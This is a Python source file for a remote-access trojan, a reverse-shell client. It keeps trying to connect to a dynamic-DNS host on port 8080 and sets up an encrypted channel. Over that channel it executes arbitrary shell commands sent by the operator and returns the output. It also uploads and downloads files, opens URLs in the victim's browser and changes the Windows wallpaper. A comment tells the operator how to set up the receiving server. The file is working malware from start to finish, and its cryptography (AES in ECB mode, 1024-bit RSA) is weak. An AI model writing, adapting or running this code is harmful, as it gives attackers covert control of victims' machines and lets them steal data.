#!/usr/bin/env python


import socket 
import subprocess 
import os          
import webbrowser
import platform
import ctypes
import hashlib
import Crypto
import Crypto.Random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA


# salt size in bytes
SALT_SIZE = 16

# number of iterations in the key generation
NUMBER_OF_ITERATIONS = 20

# the size multiple required for AES
AES_MULTIPLE = 16

def generate_key(password, salt, iterations):
    assert iterations > 0

    key = password + salt

    for i in range(iterations):
        key = hashlib.sha256(key).digest()  

    return key

def pad_text(text, multiple):
    extra_bytes = len(text) % multiple

    padding_size = multiple - extra_bytes

    padding = chr(padding_size) * padding_size

    padded_text = text + padding

    return padded_text

def unpad_text(padded_text):
    padding_size = ord(padded_text[-1])

    text = padded_text[:-padding_size]

    return text

def encrypt(plaintext, password):
    salt = Crypto.Random.get_random_bytes(SALT_SIZE)

    key = generate_key(password, salt, NUMBER_OF_ITERATIONS)

    cipher = AES.new(key, AES.MODE_ECB)

    padded_plaintext = pad_text(plaintext, AES_MULTIPLE)

    ciphertext = cipher.encrypt(padded_plaintext)

    ciphertext_with_salt = salt + ciphertext

    return ciphertext_with_salt

def decrypt(ciphertext, password):
    salt = ciphertext[0:SALT_SIZE]

    ciphertext_sans_salt = ciphertext[SALT_SIZE:]

    key = generate_key(password, salt, NUMBER_OF_ITERATIONS)

    cipher = AES.new(key, AES.MODE_ECB)

    padded_plaintext = cipher.decrypt(ciphertext_sans_salt)

    plaintext = unpad_text(padded_plaintext)

    return plaintext









def transfer(s,command,username):
    x1,src,dst=map(str,command.split(' '))
    if (x1=='download'):
        if os.path.exists(src):
            f = open(src, 'rb')
            packet = f.read(1024)
            while packet != '':
                s.send(packet) 
                packet = f.read(1024)
            s.send('DONE')
            f.close()
        else: # the file doesn't exist
            s.send('Unable to find out the file')
        md5_cl=hashlib.md5(open(src,'rb').read()).hexdigest()
        md5_sv=s.recv(1024)
        if md5_sv==md5_cl :
            s.send('md5 OK')
        else :
            s.send('md5 NOK')
  
    elif (x1=='upload'):
        file_to_write=open(dst,'wb')
        bits=s.recv(1024)    
        while True: 
            if not bits.endswith('DONE'):
                file_to_write.write(bits)
            elif bits.endswith('DONE'):
                bits=bits.replace('DONE','')
                file_to_write.write(bits)
                file_to_write.close()
                break
            bits=s.recv(1024)
        md5_cl=hashlib.md5(open(dst,'rb').read()).hexdigest()
        md5_sv=s.recv(1024)
        if md5_cl==md5_sv:
            s.send('md5 OK')
        else :
            s.send('md5 NOK')
          

def __browse(s,command):
    new = 2 
    url=command.split(' ')[-1]
    url="http://"+url
    webbrowser.open(url)

def change_desktop_bg(s,command):

    bg_path=str(command.split(' ')[-1])
    
    SPI_SETDESKWALLPAPER = 20 
    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, bg_path , 0)

        
def connect():
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    #rmdomain is the freee dynamic domain name you created for your server it should be easy to configure it just download noip client 
    #start the client, configure your router/firewall to redirect traffic for port 8080 to your internal server and that should be it
    
    rmdomain='dontrace.ddns.net'
    while True:
    	rhost=socket.gethostbyname(rmdomain)
    	if s.connect_ex((rhost,8080))==0:
    		break
    
    os=str(platform.system())

    CMD =  subprocess.Popen('whoami', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    username=str(CMD.stdout.read().split('\\')[-1])
    s.send(username)

    private_key = RSA.generate(1024)

    public_key = private_key.publickey()

    send_public=public_key.exportKey()

    s.send(send_public)

    secret_enc=s.recv(1024)

    secret=private_key.decrypt(secret_enc)

    s.send(secret)

    while True: 
        
        command=decrypt(s.recv(1024),secret)

        if 'terminate' in command:
            s.close()
            break 
        elif 'download' in command:            
            transfer(s,command,username)
        elif 'upload' in command:
            transfer(s,command,username)
        elif 'browse' in command:
            __browse(s,command)
        elif ('change_desktop_bg' in command ) and (os=='Windows'):             #BTW This is working only on windows
            change_desktop_bg(s,command)
        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            out=CMD.stdout.read()
            err=CMD.stderr.read()
            if err:
                s.send(encrypt(err,secret) )
            else :
                s.send(encrypt(out,secret) )
            

def main ():
    connect()
main()






